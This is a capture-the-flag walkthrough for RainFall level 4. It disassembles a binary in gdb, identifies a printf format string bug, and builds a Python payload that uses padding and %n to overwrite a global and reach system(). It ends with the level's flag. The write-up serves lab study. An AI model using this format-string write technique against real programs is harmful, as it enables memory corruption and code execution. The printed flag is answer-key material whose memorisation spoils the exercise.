# Level 4

like the previous level we have a benary file `level4` when we excute it wait for input and print it.

```c
level4@RainFall:~$ ./level4
Hack me
Hack me
```

let check the binary file withh gdb and see what is going on

**main function**

```c
(gdb) disassemble main
Dump of assembler code for function main:
   0x080484a7 <+0>:	push   ebp
   0x080484a8 <+1>:	mov    ebp,esp
   0x080484aa <+3>:	and    esp,0xfffffff0
   0x080484ad <+6>:	call   0x8048457 <n>
   0x080484b2 <+11>:	leave
   0x080484b3 <+12>:	ret
End of assembler dump.
```

in main function we can see that it call the function `n` so let check it

**n function**

```c
(gdb) disas n
Dump of assembler code for function n:
   0x08048457 <+0>:	push   ebp
   0x08048458 <+1>:	mov    ebp,esp
   0x0804845a <+3>:	sub    esp,0x218
   0x08048460 <+9>:	mov    eax,ds:0x8049804
   0x08048465 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x08048469 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x08048471 <+26>:	lea    eax,[ebp-0x208]
   0x08048477 <+32>:	mov    DWORD PTR [esp],eax
   0x0804847a <+35>:	call   0x8048350 <fgets@plt>
   0x0804847f <+40>:	lea    eax,[ebp-0x208]
   0x08048485 <+46>:	mov    DWORD PTR [esp],eax
   0x08048488 <+49>:	call   0x8048444 <p>
   0x0804848d <+54>:	mov    eax,ds:0x8049810
   0x08048492 <+59>:	cmp    eax,0x1025544
   0x08048497 <+64>:	jne    0x80484a5 <n+78>
   0x08048499 <+66>:	mov    DWORD PTR [esp],0x8048590
   0x080484a0 <+73>:	call   0x8048360 <system@plt>
   0x080484a5 <+78>:	leave
   0x080484a6 <+79>:	ret
End of assembler dump.

```

**p function**

```c
(gdb) disass p
Dump of assembler code for function p:
   0x08048444 <+0>:     push   ebp
   0x08048445 <+1>:     mov    ebp,esp
   0x08048447 <+3>:     sub    esp,0x18
   0x0804844a <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x0804844d <+9>:     mov    DWORD PTR [esp],eax
   0x08048450 <+12>:    call   0x8048340 <printf@plt>
   0x08048455 <+17>:    leave
   0x08048456 <+18>:    ret
End of assembler dump.
```

as the previous level we need to change 0x8049810 to be equal 0x1025544.

```c
level4@RainFall:~$ ./level4
AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
AAAA b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825
level4@RainFall:~$
```

we have a foramt string vulnerability the offset is 12 so we change this 0x8049810 content by %n so we use this scrript.

```c
Breakpoint 1 at 0x8048492
(gdb) r < a
Starting program: /home/user/level4/level4 < a
�b7ff26b0bffff764b7fd0ff400bffff728804848dbffff520200b7fd1ac0b7ff37d0

Breakpoint 1, 0x08048492 in n ()
(gdb) x/x 0x08048492
0x8048492 <n+59>:       0x0255443d
(gdb) x/x 0x8049810
0x8049810 <m>:  0x00000048
(gdb) p 0x8049810
$1 = 134518800
(gdb) p *0x8049810
$2 = 72
(gdb)
```

0x1025544 = 16930116 - 72 = 16,930,044 we need to add 16,930,044 characters.

```c
level4@RainFall:~$ cat a -| ./level4
�b7ff26b0bffff794b7fd0ff400bffff758804848dbffff550200b7fd1ac0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaalevel4@RainFall:~$
```

we cant pass this huge number to fgets so we use printf's padding.

```python
level4@RainFall:~$ python -c 'print("\x08\x04\x98\x10"[::-1] + "%x" * 10 + "%16930052x" + "%n")' > a
```

```
(gdb) info register
eax            0x1025544        16930116
```

taraaaaaaaaaaaaaaaaaaaaaaaaaaa:

0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

 <!-- visca barca -->
